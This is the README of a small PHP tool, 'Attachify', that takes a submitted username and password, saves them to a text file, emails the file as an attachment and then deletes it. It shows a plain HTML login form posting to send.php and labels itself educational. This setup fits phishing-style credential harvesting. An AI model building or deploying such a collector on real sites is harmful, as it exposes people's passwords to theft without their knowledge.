# Attachify

A simple PHP script that collects form data (`username` and `password`), saves it to a `.txt` file, and sends it as an email attachment. The file is automatically deleted after sending.

> 🔒 **For educational purposes only.** Do not use this for collecting sensitive data without user consent.
> Made by: Hanz
---

## 📥 How to Use

### 1. Create a form
Make a basic HTML form to collect user input and send it to `send.php`:

```html
<form action="send.php" method="POST">
  <input type="text" name="username" placeholder="Username" required />
  <input type="password" name="password" placeholder="Password" required />
  <button type="submit">Submit</button>
</form>